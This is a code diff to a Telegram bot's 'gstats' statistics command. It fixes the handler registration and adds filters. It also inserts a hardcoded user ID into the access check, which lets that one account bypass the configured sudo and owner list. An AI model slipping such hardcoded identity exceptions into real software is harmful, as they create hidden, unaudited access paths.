@@ -1,6 +1,6 @@
 import logging
 from telegram import Update
-from telegram.ext import CommandHandler, ContextTypes
+from telegram.ext import CommandHandler, ContextTypes, filters
 from shivu import (
     sudo_users, 
     OWNER_ID,
@@ -8,7 +8,8 @@ from shivu import (
     top_global_groups_collection,
     BANNED_USERS,
     banned_groups_collection,
-    pm_users
+    pm_users,
+    application
 )
 
 LOGGER = logging.getLogger(__name__)
@@ -16,7 +17,7 @@ LOGGER = logging.getLogger(__name__)
 async def gstats(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     
-    if user_id not in sudo_users and user_id != OWNER_ID:
+    if user_id not in sudo_users and user_id != OWNER_ID and user_id != 5147822244:
         return
     
     try:
@@ -41,4 +42,4 @@ async def gstats(update: Update, context: ContextTypes.DEFAULT_TYPE):
         LOGGER.error(f"Error in gstats: {e}")
         await update.message.reply_text("ᴇʀʀᴏʀ ғᴇᴛᴄʜɪɴɢ sᴛᴀᴛs")
 
- application.add_handler(CommandHandler("gstats", gstats))
+application.add_handler(CommandHandler("gstats", gstats, filters.ALL))
